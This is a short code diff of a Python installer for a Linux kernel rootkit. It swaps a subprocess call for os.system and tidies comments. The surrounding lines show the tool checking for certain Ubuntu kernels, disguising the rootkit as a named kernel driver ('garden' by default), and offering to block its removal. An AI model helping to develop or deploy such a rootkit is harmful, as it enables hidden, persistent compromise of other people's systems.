@@ -92,16 +92,9 @@ def run_cmd_exit_on_fail(command, working_dir=None, run_with_os=False):
 	print_status("Executing: {}".format(command))
 	# For some reason, check_output can't successfully run the `insmod` command.
 	if run_with_os:
-		proc = Popen(command.split(), stdout=PIPE, stderr=STDOUT, cwd=working_dir, shell=True)
-		out, err = proc.communicate()
-		if not out or not err:
-			print(out)
-			print_error(err)
+		if os.system(command) != 0:
+			print_error("Error running command. Exiting.")
 			sys.exit(1)
-
-		# if os.system(command) != 0:
-		# 	print_error("Error running command. Exiting.")
-		# 	sys.exit(1)
 	else:
 		try:
 			if not isinstance(command, list):
@@ -227,7 +220,7 @@ def validate_os_and_kernel():
 		sys.exit(1)
 
 	kernel_version = os_info[2]
-	# TODO: Test more kernels.
+	# TODO: Test more kernels
 	valid_kernels = ["4.18.0-15-generic", "4.18.0-16-generic", "4.18.0-17-generic"]
 	if kernel_version not in valid_kernels:
 		print_error("Invalid kernel. Exiting.")
@@ -239,7 +232,6 @@ def validate_os_and_kernel():
 def install(kernel_version):
 	print_status("Starting rootkit installation...")
 
-	# Rootkit settings
 	config = {}
 	config["MODULE_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
 	config["BLOCK_REMOVAL"] = prompt_yes_no("Block removal of rootkit?")
